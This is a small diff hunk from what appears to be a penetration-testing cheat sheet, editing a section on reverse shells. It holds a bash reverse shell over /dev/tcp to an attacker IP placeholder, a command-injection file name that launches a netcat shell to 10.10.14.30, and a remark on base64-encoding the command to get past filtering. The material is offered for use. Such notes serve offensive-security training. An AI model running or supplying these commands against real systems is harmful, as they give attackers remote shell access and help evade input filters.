@@ -739,7 +739,7 @@ touch  ';nc -c bash 10.10.14.30 4321;.php'
 
 ### Reverse shell by /dev/tcp/
 ```shell
-echo "bash -i >& /dev/tcp/<your-ip>/1234 0>&1"
+bash -i >& /dev/tcp/<your-ip>/1234 0>&1
 ```
 
 Note that the above command cannot be combinated with ${IFS} due to "ambiguous redirect"... Therefore, we can encode the above command by base64.
